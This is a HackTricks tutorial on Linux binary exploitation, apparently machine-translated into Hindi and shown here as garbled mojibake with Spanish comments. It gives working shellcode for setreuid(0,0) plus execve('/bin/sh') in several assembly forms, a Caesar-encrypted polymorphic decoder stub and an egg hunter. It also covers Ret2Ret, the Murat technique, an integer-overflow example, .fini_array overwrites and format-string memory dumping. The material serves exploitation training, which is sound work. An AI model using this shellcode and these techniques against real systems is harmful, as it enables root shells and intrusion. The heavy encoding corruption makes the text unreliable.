# рд▓рд┐рдирдХреНрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯрд┐рдВрдЧ (рдореВрд▓) (SPA)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** (https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep тАЬ\_\_NR\_тАЭ

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(тАЬ/bin/shтАЭ, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 тАФ> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** тАФ> рд╣рдореЗрдВ рдПрдХ .o рдлрд╝рд╛рдЗрд▓ рджреЗрддрд╛ рд╣реИ\
**ld assembly.o -o shellcodeout** тАФ> рд╣рдореЗрдВ рдПрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрд╕реЗрдореНрдмрд▓реА рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╣рдо рдСрдкрдХреЛрдбреНрд╕ рдХреЛ **objdump** рдХреЗ рд╕рд╛рде рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ\
**objdump -d -Mintel ./shellcodeout** тАФ> рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдорд╛рд░реА рд╢реЗрд▓рдХреЛрдб рд╣реИ рдФрд░ рдСрдкрдХреЛрдбреНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП

**рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рд╢реЗрд▓рдХреЛрдб рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ**
```
char shellcode[] = тАЬ\x31\xc0\x31\xdb\xb0\x01\xcd\x80тАЭ

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╣реЛ рд░рд╣реЗ рд╣реИрдВ, рдкрд┐рдЫрд▓реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ **strace ./рдХрдВрдкрд╛рдЗрд▓_рдХрд┐рдпрд╛_рдЧрдпрд╛_рдкреНрд░реЛрдЧреНрд░рд╛рдо** рдореЗрдВ рджрд┐рдЦрдирд╛ рдЪрд╛рд╣рд┐рдПред

рд╢реИрд▓рдХреЛрдб рдмрдирд╛рддреЗ рд╕рдордп рдПрдХ рдЪрд╛рд▓ рд▓рд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдкрд╣рд▓рд╛ рдирд┐рд░реНрджреЗрд╢ рдПрдХ рдХреЙрд▓ рдХреЛ рдЬрдореНрдк рдХрд░рддрд╛ рд╣реИред рдХреЙрд▓ рдореВрд▓ рдХреЛрдб рдХреЛ рдмреБрд▓рд╛рддрд╛ рд╣реИ рдФрд░ рд╕рд╛рде рд╣реА EIP рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИред рдХреЙрд▓ рдирд┐рд░реНрджреЗрд╢ рдХреЗ рдмрд╛рдж, рд╣рдордиреЗ рдЙрд╕ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдбрд╛рд▓ рджрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдХреА рд╣рдореЗрдВ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА, рдЗрд╕рд▓рд┐рдП рдЙрд╕ EIP рдХреЗ рд╕рд╛рде рд╣рдо рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╛рде рд╣реА рдХреЛрдб рдХреЛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг **рдЪрд╛рд▓ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al ├║ltimo call
popl                %esi                                       ; Guardamos en ese la direcci├│n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=тАЬ/bin/shтАЭ
leal                 0x8(%esi), %ecx      ; arg[2] = {тАЬ/bin/shтАЭ, тАЬ0тАЭ}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(тАЬ/bin/shтАЭ, [тАЬ/bin/shтАЭ, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci├│n
.string             \тАЭ/bin/sh\тАЭ                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
**/bin/sh рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ ESP:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; тАЬ\0тАЭ
push               dword 0x68732f2f ; тАЬ//shтАЭ
push               dword 0x6e69622f; тАЬ/binтАЭ
mov                ebx, esp                     ; arg1 = тАЬ/bin//sh\0тАЭ
push               eax                             ; Null -> args[1]
push               ebx                             ; тАЬ/bin/sh\0тАЭ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(тАЬ/bin/shтАЭ, args[тАЬ/bin/shтАЭ, тАЬNULLтАЭ], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut├│ fabs
тАж
```
**рдЕрдВрдбрд╛ рд╣рдВрдЯрд░:**

рдпрд╣ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдХреЛрдб рд╣реИ рдЬреЛ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЬреБрдбрд╝реА рдореЗрдореЛрд░реА рдкреЗрдЬреЛрдВ рдХреЛ рдЪреЗрдХ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣рд╛рдБ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╢реЗрд▓рдХреЛрдб рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХреЗ (рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдбрд╛рд▓реА рдЧрдИ рдХреЛрдИ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдвреВрдВрдврддрд╛ рд╣реИ)ред рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдереЛрдбрд╝реА рд╕реА рдЬрдЧрд╣ рд╣реЛрдиреЗ рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреБрдХреНрддред

**рдкреЙрд▓рд┐рдореЙрд░реНрдлрд┐рдХ рд╢реЗрд▓рдХреЛрдб**

рдпреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╢реЗрд▓реНрд╕ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, Call-Pop рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдпрд╣ рдПрдХ **рд╕реАрдЬрд╝рд░ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЙрджрд╛рд╣рд░рдг** рд╣реЛрдЧрд╛:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer├б)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu├н va el shellcode
```
## **5.рдЕрддрд┐рд░рд┐рдХреНрдд рддрдХрдиреАрдХреЗрдВ**

**Ret2Ret**

рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬрдм EIP рдореЗрдВ рд╕реНрдЯреИрдХ рдХрд╛ рдкрддрд╛ рдирд╣реАрдВ рдбрд╛рд▓ рд╕рдХрддреЗ (EIP рдореЗрдВ 0xbf рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП) рдпрд╛ рдЬрдм shellcode рдХреА рд╕реНрдерд╛рдирдирд┐рд░реНрдзрд╛рд░рдг рдХрд┐рдпрд╛ рдирд╣реАрдВ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд▓реЗрдХрд┐рди, рд╡рдВрд▓рд░реЗрдмрд▓ рдлрд╝рдВрдХреНрд╢рди рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ (рдпрд╣рд╛рдБ shellcode рдЬрд╛рдПрдЧрд╛)ред

рдЗрд╕ рддрд░рд╣, EIP рдХреЛ **ret** рдХреЗ рдкрддреЗ рд╕реЗ рдмрджрд▓рдХрд░, рдЕрдЧрд▓рд╛ рдкрддрд╛ рд▓реЛрдб рд╣реЛрдЧрд╛ (рдЬреЛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрд╣рд▓реЗ рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдХрд╛ рдкрддрд╛ рд╣реИ)ред рдЕрд░реНрдерд╛рдд, shellcode рд▓реЛрдб рд╣реЛрдЧрд╛ред

рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣реЛрдЧрд╛: SHELLCODE + рднрд░рд╛рдИ (EIP рддрдХ) + **\&ret** (рдкрд╛рдЗрд▓ рдХреЗ рдЕрдЧрд▓реЗ рдмрд╛рдЗрдЯреНрд╕ shellcode рдХреЗ рд╢реБрд░реБрдЖрдд рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрддрд╛ рд╕реНрдЯреИрдХ рдореЗрдВ рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ)

рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ **strncpy** рдЬреИрд╕реЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдкреВрд░реНрдг рд╣реЛрдиреЗ рдкрд░ рдкрд╛рдЗрд▓ рд╕реЗ shellcode рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рд░рдЦреЗ рдЧрдП рдкрддреЗ рдХреЛ рд╣рдЯрд╛ рджреЗрддреЗ рд╣реИрдВ, рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдЕрд╕рдВрднрд╡ рдмрдирд╛рддреЗ рд╣реИрдВред рдЕрд░реНрдерд╛рдд, рд╡рд╣ рдкрддрд╛ рдЬреЛ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрд░реНрдЧреНрдпреВрдореЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреЛ shellcode рдХреЛ рд░рдЦрддрд╛ рд╣реИ) рдХреЛ 0x00 рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЗрд╕рд▓рд┐рдП рджреВрд╕рд░реЗ **ret** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдкрд░ рдпрд╣ 0x00 рдХреЗ рд╕рд╛рде рдорд┐рд▓рддрд╛ рд╣реИ рдФрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдмрдВрдж рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред



**Murat рддрдХрдиреАрдХ**

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рд╕рднреА рдкреНрд░реЛрдЧреНрд░рд╛рдо 0xbfffffff рд╕реЗ рдЖрд░рдВрдн рд╣реЛрддреЗ рд╣реИрдВред

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдПрдХ рдирдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕реНрдЯреИрдХ рдХреИрд╕реЗ рдирд┐рд░реНрдорд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХреЛ рджреЗрдЦрдХрд░, рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдПрдХ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдП рдЬрд┐рд╕рдореЗрдВ рдХреЗрд╡рд▓ shellcode рдПрдХрдорд╛рддреНрд░ рдЪрд░ рд╣реЛред рдЗрд╕рдХрд╛ рдкрддрд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЪрд░ рд╡рд╛рд▓реА рдЪрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдХреЗрд╡рд▓ рдЗрд╕рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ execle рдлрд╝рдВрдХреНрд╢рди рдПрдХ рд╡рд╛рддрд╛рд╡рд░рдг рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЗрд╡рд▓ рд╡рд╛рддрд╛рд╡рд░рдг рдЪрд░ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ

**рдкреВрд░реНрдгрд╛рдВрдХ рдУрд╡рд░рдлреНрд▓реЛ**

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдУрд╡рд░рдлреНрд▓реЛ рдЙрд╕ рд╕рдордп рд╣реЛрддреЗ рд╣реИрдВ рдЬрдм рдПрдХ рдЪрд░рд┐рддреНрд░ рдПрдХ рдЗрддрдиреЗ рдмрдбрд╝реЗ рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдирд╣реАрдВ рд╣реИ, рд╕рдВрдХреЗрдд рд╕рд╣рд┐рдд рдФрд░ рд╕рдВрдХреЗрдд рд░рд╣рд┐рдд рдЪрд░рд┐рддреНрд░реЛрдВ рдХреЗ рдмреАрдЪ рдЧрд▓рддрдлрд╣рдореА рдХреЗ рдХрд╛рд░рдг, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рджреЛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рд╣реИред рдкрд╣рд▓рд╛ рдЕрдЧрд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рд▓рдВрдмрд╛рдИ рдФрд░ рджреВрд╕рд░рд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧред

рдЕрдЧрд░ рд╣рдо рдкрд╣рд▓реЗ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдирдХрд╛рд░рд╛рддреНрдордХ рд╕рдВрдЦреНрдпрд╛ рдкрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рдирд┐рдХрд▓реЗрдЧрд╛ рдХрд┐ len < 256 рдФрд░ рд╣рдо рдЙрд╕ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдкрд╛рд░ рдХрд░реЗрдВрдЧреЗ, рдФрд░ рд╕рд╛рде рд╣реА strlen(buffer) рднреА l рд╕реЗ рдХрдо рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ l unsigned int рд╣реИ рдФрд░ рдмрд╣реБрдд рдмрдбрд╝рд╛ рд╣реЛрдЧрд╛ред

рдпрд╣ рдкреНрд░рдХрд╛рд░ рдХреЗ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреБрдЫ рд▓рд┐рдЦрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдирд╣реАрдВ рдХрд░рддрд╛, рдмрд▓реНрдХрд┐ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧрд▓рдд рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдП рдЧрдП рдлрд╝рд┐рд▓реНрдЯрд░реЛрдВ рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

**рдЕрд╡рд┐рдХрд▓реНрдкрд┐рдд рдЪрд░**

рдПрдХ рдЕрд╡рд┐рдХрд▓реНрдкрд┐рдд рдЪрд░ рдХрд╛ рдорд╛рди рдХреНрдпрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рдкрддрд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рдФрд░ рдЗрд╕реЗ рджреЗрдЦрдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдкрд┐рдЫрд▓реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдЪрд░ рдХрд╛ рдорд╛рди рд▓реЗ рдФрд░ рдпрд╣ рд╣рдорд▓рд╛рд╡рд╛рджреА рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЛред

##

###

###

###

### **.fini\_array**

рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ **рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╕рдВрд░рдЪрдирд╛** рд╣реИред рдпрд╣ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдЕрдЧрд░ рдЖрдк рдПрдХ рдкрддреЗ рдкрд░ рдЬрд╛рдХрд░ рдЕрдкрдирд╛ **рд╢реИрд▓рдХреЛрдб рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдпрд╛ рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ **рджреВрд╕рд░реА рдмрд╛рд░ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ **рд╣рдореЗрд╢рд╛** **рдПрдХ рдЕрдирдВрдд рд▓реВрдк** рдирд╣реАрдВ **рдмрдирд╛рдПрдЧрд╛** рдХреНрдпреЛрдВрдХрд┐ рдЬрдм рдЖрдк рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЖрддреЗ рд╣реИрдВ, рдХреИрдиреЗрд░реА рдзреНрдпрд╛рди рджреЗрдЧрд╛, рд╕реНрдЯреИрдХ рдХрд╛ рдЕрдВрдд рдХреНрд╖рддрд┐рдЧреНрд░рд╕реНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдлрд┐рд░ рд╕реЗ рдирд╣реАрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХреЗ рд╕рд╛рде рдЖрдкрдХреЛ рд╡рд▓реНрди рдХрд╛ рдПрдХ рдЕрдзрд┐рдХ рдирд┐рд╖реНрдкрд╛рджрди рд╣реЛрдЧрд╛ред

### **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рд╕рд╛рдордЧреНрд░реА рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**

рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреА рдореЗрдореЛрд░реА рд╕реЗ рд╕рд╛рдордЧреНрд░реА рдХреЛ **рдбрдВрдк** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ **рд╕реНрдЯреИрдХ рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рдЪрд░ pointing рдПрдХ рдЭрдВрдбреЗ рдХреА рдУрд░ рд╣реИред** рдпрджрд┐ рдЖрдк **рдвреВрдВрдврд╝реЗрдВ** рдХрд┐ **рдореЗрдореЛрд░реА** рдореЗрдВ **рдЭрдВрдбреЗ** рдХрд╛ **рдкреЙрдЗрдВрдЯрд░** рдХрд╣рд╛рдБ рд╣реИ, рддреЛ рдЖрдк **рдкреНрд░рд┐рдВрдЯрдлрд╝** рдХреЛ рдЙрд╕ **рдкрддреЗ** рддрдХ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЭрдВрдбрд╛** **рдкреНрд░рд┐рдВрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

рдЗрд╕рд▓рд┐рдП, рдЭрдВрдбрд╛ **0xffffcf4c** рдореЗрдВ рд╣реИ

![](<../../.gitbook/assets/image (618) (2).png>)

рдФрд░ рд▓реАрдХ рд╕реЗ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдЭрдВрдбреЗ рдХрд╛ рдкреЙрдЗрдВрдЯрд░** **8рд╡рд╛рдВ** рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рд╣реИ:

![](<../../.gitbook/assets/image (623).png>)

рдЗрд╕рд▓рд┐рдП, **8рд╡реЗрдВ рдкреИрд░рд╛рдореАрдЯрд░** рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдЖрдк рдЭрдВрдбрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (624).png>)

